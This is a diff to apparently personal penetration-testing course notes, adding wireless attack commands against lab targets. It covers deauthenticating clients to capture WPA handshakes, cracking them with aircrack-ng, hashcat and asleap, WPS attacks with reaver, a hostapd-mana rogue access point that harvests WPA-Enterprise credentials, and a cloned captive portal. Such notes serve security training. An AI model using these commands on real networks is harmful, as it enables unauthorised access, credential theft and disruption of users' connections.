@@ -1632,9 +1632,10 @@ done
 
 Used to setup monitor mode
 
-- `sudo airmon-ng start <wlan0>` will result to wlan0mon
-- `sudo iw dev wlan0mon info`
+- `sudo airmon-ng start <wlan0>` - change to monitor mode, will result to wlan0mon
+- `sudo iw dev wlan0mon info` - check current channel
 - `sudo airmon-ng stop wlan0mon`
+- 
 
 ### Airodump-ng
 
@@ -1666,12 +1667,13 @@ Basic Injection Test
 
 ### Aircrack-ng
 
+Can crack WEP and WPA/WPA2 networks that use pre-shared keys or PMKID
 [Nice Tut](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)
 
 - Put wlan0 to monitor mode
 - `sudo airodump-ng wlan0mon` dump all wireless
 - List down details of our target BSSID(Mac address of AP), Station(Client connected Mac address), AUTH(PSK)
-- aircrack-ng does not work with Enterprise(MGT), Opportunistic Wireless Encryption(OWE) cannot be cracked yet.
+- Look for AUTH column, should be PSK. aircrack-ng does not work with Enterprise(MGT), Opportunistic Wireless Encryption(OWE) cannot be cracked yet.
 - use airodump again against the specific AP target `sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon` this will save the result to wpa.cap
 - Aireplay to deauth the client and capture 4-way Handshake `sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon` The `-0 1` means Deauth once.
 - Once client reconnects we will be able to capture a handshake
@@ -1693,11 +1695,11 @@ Custom Wordlist for Aircrack
 Cracking with Hashcat
 
 - convert pcap to hccapx `/usr/lib/hashcat-utils/cap2hccapx.bin <.pcap> output.hccapx`
-- `hashcat -m 2500 output.hccapx <wordlist>`
+- `hashcat -m 2500 output.hccapx /usr/share/joh/password.lst`
 
 ### Airolib-ng
 
-Used to compute Pairwise Master Keys(PMK)
+Used to compute Pairwise Master Keys(PMK) and use them in order to crack WPA and WPA2 PSK passphrases.
 
 - `echo wifu > essid.txt`
 - `airolib-ng wifu.sqlite --import essid essid.txt`
@@ -1713,6 +1715,86 @@ Used for rainbow table attacks to crack WPA passphrases
 - `genpmk -f <wordlist> -d outfile -s wifu` kinda like airolib
 - `cowpatty -r <pcap> -d <outfilefromgenpmk> -s wifu`
 
+### Attacking WPS
+
+- `wash -i wlan0mon` to know version of WPS, LCK column indicicates if WPS is locked(cant attack)
+- `sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K` `-K` means we are using pixieWPS
+
+### Attacking WPA Enterprise (MGT)
+
+- `sudo airodump-ng wlan0mon` to identify target
+- `sudo airodump-ng -c 2 -w Playtronics wlan0mon` to scan specifically on ch 2 and save data to Playtronics file
+(Getting CERT is OPTIONAL SKIP to hostapd-mana)
+- `sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon` deauth a client to get the cert
+- when client reconnects and airodump-ng indicates handshake has been captured. stop the capture and run wireshark. locate the server certificate frame. 
+- `tls.handshake.type == 11` or `tls.handshake.certificate` filter used to find cert in wireshark
+- In the Packet Details pane. Transport Layer Security > TLSv1.2 Record Layer: Handshake Protocol: Certificate > handshake protocol: certificate > Certificates
+- for each certificate: right click and select `Export Packet Bytes` ti save the data into a `.der` file.
+- certificates can be checked using `openssl x509 -inform der -in CERTIFICATE_FILENAME -text`
+- not necessary but can be `.der` can be converted to `.pem` using `openssl x509 -inform der -in CERTIFICATE_FILENAME -outform pem -out OUTPUT_PEM.crt`
+- go to `/etc/freeradius/3.0/certs` and edit `ca.cnf`  and `server.cnf`
+- run `rm dh` and then `make` inside the `certs` dir
+- edit `/etc/hostapd-mana/mana.conf`
+- `sudo hostapd-mana /etc/hostapd-mana/mana.conf`
+- cracking hash using `asleap` `asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst`
+
+
+
+```bash
+...
+[certificate_authority]
+countryName             = US
+stateOrProvinceName     = CA
+localityName            = San Francisco
+organizationName        = Playtronics
+emailAddress            = ca@playtronics.com
+commonName              = "Playtronics Certificate Authority"
+...
+```
+```bash
+...
+[server]
+countryName             = US
+stateOrProvinceName     = CA
+localityName            = San Francisco
+organizationName        = Playtronics
+emailAddress            = admin@playtronics.com
+commonName              = "Playtronics"
+...
+```
+hostapd-mana config
+```bash
+interface=wlan1
+ssid=<ESSID>
+hw_mode=g
+channel=6
+auth_algs=3
+wpa=3
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=TKIP CCMP
+ieee8021x=1
+eap_server=1
+eap_user_file=hostapd.eap_user
+ca_cert=/root/certs/ca.pem
+server_cert=/root/certs/server.pem
+private_key=/root/certs/server.key
+dh_file=/root/certs/dhparam.pem
+mana_wpe=1
+mana_eapsuccess=1
+mana_credout=hostapd.creds
+```
+
+### Captive Portals
+
+- `sudo airodump-ng -w discovery --output-format pcap wlan0mon`
+- `sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon`
+- build captive portal
+  - `sudo apt install apache2 libapache2-mod-php`
+  - `wget -r -l2 https://www.megacorpone.com`
+  - `sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/`
+  - `sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/`
+
+`nmcli device wifi connect <SSID> password <password>`
 
 
 ## SNMP
